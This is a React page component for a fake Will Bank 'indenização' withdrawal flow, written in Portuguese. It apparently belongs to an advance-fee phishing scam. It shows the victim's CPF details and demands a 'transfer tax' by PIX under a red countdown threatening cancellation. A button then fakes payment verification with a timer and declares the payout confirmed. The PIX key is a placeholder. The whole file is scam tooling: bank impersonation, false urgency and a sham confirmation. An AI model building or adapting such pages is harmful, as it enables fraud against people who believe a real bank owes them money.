import { useEffect, useState } from "react";
import { useNavigate, useLocation } from "react-router-dom";
import { Button } from "@/components/ui/button";
import { 
  CheckCircle, 
  Copy, 
  Clock,
  QrCode,
  Loader2
} from "lucide-react";
import WillBankHeader from "@/components/WillBankHeader";
import WillBankCard from "@/components/WillBankCard";
import WillBankFooter from "@/components/WillBankFooter";
import { CPFData } from "@/lib/cpf";
import { toast } from "@/hooks/use-toast";
import willbankLogo from "@/assets/willbank-logo.png";

const Saque = () => {
  const navigate = useNavigate();
  const location = useLocation();
  const [isProcessing, setIsProcessing] = useState(false);
  const [isCompleted, setIsCompleted] = useState(false);
  const [countdown, setCountdown] = useState(600); // 10 minutes

  const cpfData: CPFData | undefined = location.state?.cpfData;
  const valorBeneficio: number | undefined = location.state?.valorBeneficio;
  const valorTaxa: number | undefined = location.state?.valorTaxa;
  const protocolo: string | undefined = location.state?.protocolo;

  useEffect(() => {
    if (!cpfData || !valorBeneficio) {
      navigate("/");
      return;
    }

    // Countdown timer
    const timer = setInterval(() => {
      setCountdown(prev => {
        if (prev <= 0) {
          clearInterval(timer);
          return 0;
        }
        return prev - 1;
      });
    }, 1000);

    return () => clearInterval(timer);
  }, [cpfData, valorBeneficio, navigate]);

  const formatTime = (seconds: number) => {
    const mins = Math.floor(seconds / 60);
    const secs = seconds % 60;
    return `${mins.toString().padStart(2, '0')}:${secs.toString().padStart(2, '0')}`;
  };

  const handleCopiarPix = () => {
    const pixCode = "00020126580014br.gov.bcb.pix0136example-pix-key-here5204000053039865802BR5925WILL BANK PAGAMENTOS6009SAO PAULO62070503***6304ABCD";
    navigator.clipboard.writeText(pixCode);
    toast({
      title: "Código PIX copiado! ✓",
      description: "Cole o código no seu aplicativo bancário",
    });
  };

  const handleConfirmarPagamento = () => {
    setIsProcessing(true);
    
    setTimeout(() => {
      setIsProcessing(false);
      setIsCompleted(true);
      toast({
        title: "Pagamento confirmado!",
        description: "Sua indenização será processada em breve",
      });
    }, 3000);
  };

  if (!cpfData || !valorBeneficio) return null;

  const taxaFinal = valorTaxa || (valorBeneficio * 0.0071);

  return (
    <div className="min-h-screen min-h-[100dvh] bg-background flex flex-col">
      <WillBankHeader 
        userName={cpfData.nome.split(' ')[0].toUpperCase()} 
        breadcrumb="Benefício > Indenização > Pagamento"
      />

      <main className="flex-1 flex items-center justify-center p-3 sm:p-6">
        <WillBankCard className="w-full max-w-lg">
          {!isCompleted ? (
            <div className="space-y-5 sm:space-y-6">
              {/* Header */}
              <div className="text-center space-y-2">
                <img src={willbankLogo} alt="Will Bank" className="h-10 sm:h-12 mx-auto" />
                <h1 className="text-lg sm:text-xl font-bold tracking-tight">Pagamento do Imposto de Transferência</h1>
              </div>

              {/* Countdown */}
              <div className="bg-gradient-to-r from-red-50 to-red-100 border-2 border-red-200 rounded-xl sm:rounded-2xl p-4 text-center shadow-sm">
                <div className="flex items-center justify-center gap-2 text-red-600">
                  <Clock className="w-4 h-4 sm:w-5 sm:h-5" />
                  <span className="font-semibold text-sm">Tempo restante:</span>
                </div>
                <p className="text-3xl sm:text-4xl font-black text-red-600 font-mono mt-2 tracking-tight">{formatTime(countdown)}</p>
                <p className="text-[10px] sm:text-xs text-red-500 mt-1.5 font-medium">Após este prazo, sua indenização será cancelada</p>
              </div>

              {/* Values Summary */}
              <div className="bg-muted/50 rounded-xl sm:rounded-2xl p-4 space-y-3 border border-border/40">
                <div className="flex justify-between items-center">
                  <span className="text-muted-foreground font-medium text-sm">Indenização a receber:</span>
                  <span className="font-black text-base sm:text-lg text-success">R$ {valorBeneficio.toLocaleString('pt-BR', { minimumFractionDigits: 2 })}</span>
                </div>
                <div className="flex justify-between items-center border-t border-border/40 pt-3">
                  <span className="text-muted-foreground font-medium text-sm">Imposto a pagar:</span>
                  <span className="font-black text-base sm:text-lg text-primary">R$ {taxaFinal.toFixed(2).replace('.', ',')}</span>
                </div>
                {protocolo && (
                  <div className="flex justify-between items-center border-t border-border/40 pt-3">
                    <span className="text-muted-foreground font-medium text-sm">Protocolo:</span>
                    <span className="font-mono text-xs sm:text-sm font-bold">{protocolo}</span>
                  </div>
                )}
              </div>

              {/* QR Code */}
              <div className="text-center space-y-4">
                <p className="text-xs sm:text-sm text-muted-foreground font-medium">Escaneie o QR Code ou copie o código PIX:</p>
                
                <div className="w-40 h-40 sm:w-48 sm:h-48 mx-auto bg-card rounded-xl sm:rounded-2xl border-2 sm:border-3 border-primary p-2.5 shadow-lg">
                  <div className="w-full h-full bg-muted/30 rounded-lg flex items-center justify-center">
                    <QrCode className="w-28 h-28 sm:w-32 sm:h-32 text-foreground" />
                  </div>
                </div>

                <Button
                  variant="outline"
                  onClick={handleCopiarPix}
                  className="w-full h-12 border-2 border-primary text-primary hover:bg-primary/10 rounded-full font-bold text-sm transition-all duration-300"
                >
                  <Copy className="w-4 h-4 mr-2" />
                  Copiar código PIX
                </Button>
              </div>

              {/* Confirm Button */}
              <Button 
                onClick={handleConfirmarPagamento}
                disabled={isProcessing}
                className="w-full h-14 text-sm sm:text-base font-black bg-gradient-to-r from-primary to-amber-400 hover:from-primary/90 hover:to-amber-400/90 text-primary-foreground rounded-full shadow-xl hover:shadow-2xl transition-all duration-300"
              >
                {isProcessing ? (
                  <>
                    <Loader2 className="w-5 h-5 animate-spin mr-2" />
                    Verificando pagamento...
                  </>
                ) : (
                  "Já paguei, liberar minha indenização"
                )}
              </Button>

              <p className="text-[10px] sm:text-xs text-center text-muted-foreground font-medium">
                Após a confirmação do pagamento, sua indenização será liberada em até 24h úteis.
              </p>
            </div>
          ) : (
            /* Success State */
            <div className="text-center space-y-6 py-4 animate-scale-in">
              <div className="w-24 h-24 sm:w-28 sm:h-28 mx-auto bg-gradient-to-br from-green-100 to-green-200 rounded-full flex items-center justify-center shadow-lg">
                <CheckCircle className="w-14 h-14 sm:w-16 sm:h-16 text-success" />
              </div>
              
              <div className="space-y-1.5">
                <h1 className="text-xl sm:text-2xl font-bold tracking-tight">Pagamento Confirmado!</h1>
                <p className="text-muted-foreground text-sm">
                  Sua indenização está sendo processada.
                </p>
              </div>

              <div className="bg-gradient-to-r from-green-50 to-emerald-50 border-2 border-green-200 rounded-xl sm:rounded-2xl p-4 space-y-3 text-left shadow-sm text-sm">
                <div className="flex justify-between">
                  <span className="text-muted-foreground font-medium">Beneficiário:</span>
                  <span className="font-bold text-right">{cpfData.nome}</span>
                </div>
                <div className="flex justify-between">
                  <span className="text-muted-foreground font-medium">CPF:</span>
                  <span className="font-bold">{cpfData.cpf}</span>
                </div>
                <div className="flex justify-between">
                  <span className="text-muted-foreground font-medium">Valor:</span>
                  <span className="font-black text-success text-base">R$ {valorBeneficio.toLocaleString('pt-BR', { minimumFractionDigits: 2 })}</span>
                </div>
                <div className="flex justify-between">
                  <span className="text-muted-foreground font-medium">Previsão:</span>
                  <span className="font-bold">Até 24h úteis</span>
                </div>
              </div>

              <Button 
                onClick={() => navigate("/")}
                variant="outline"
                className="w-full h-12 rounded-full font-bold text-sm border-2 hover:bg-muted/50 transition-all duration-300"
              >
                Voltar ao início
              </Button>
            </div>
          )}
        </WillBankCard>
      </main>

      <WillBankFooter />
    </div>
  );
};

export default Saque;
